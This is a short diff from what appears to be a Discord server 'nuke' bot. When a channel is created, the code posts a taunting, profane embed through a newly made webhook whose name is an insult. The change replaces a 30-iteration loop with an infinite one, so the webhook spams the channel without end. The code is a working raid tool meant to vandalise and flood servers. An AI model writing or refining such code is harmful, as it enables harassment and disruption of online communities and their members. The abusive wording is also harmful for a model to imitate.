@@ -153,7 +153,8 @@ async def on_guild_channel_create(channel):
     embed = {"description": "ㅤㅤㅤㅤㅤㅤThis shit got nuked by [Veronica](https://youtu.be/NNv2RHR62Rs?si=pcYo5pUNxekaAKoo)\nㅤ\n\nㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ[`#Verox1`](https://discord.gg/limed)\nㅤㅤㅤㅤㅤㅤㅤㅤㅤ[ClownFucker](https://youtu.be/NNv2RHR62Rs?si=pcYo5pUNxekaAKoo) - [FuckYourSelf](https://youtu.be/NNv2RHR62Rs?si=pcYo5pUNxekaAKoo)", "color": 2764080, "footer": {"text": "ㅤㅤ"}, "image": {"url": "https://cdn.discordapp.com/attachments/1229507442476584970/1230384817963798639/2856-utopia-banner.jpg"}}
     webhook = await channel.create_webhook(name="Veronica Tarafindan Sikidli")
     async with aiohttp.ClientSession() as session:
-        for i in range(30):
+        a = 0
+        while (a == 0):
             try:
                 headers = {'Content-Type': 'application/json'}
                 webhook_url = webhook.url
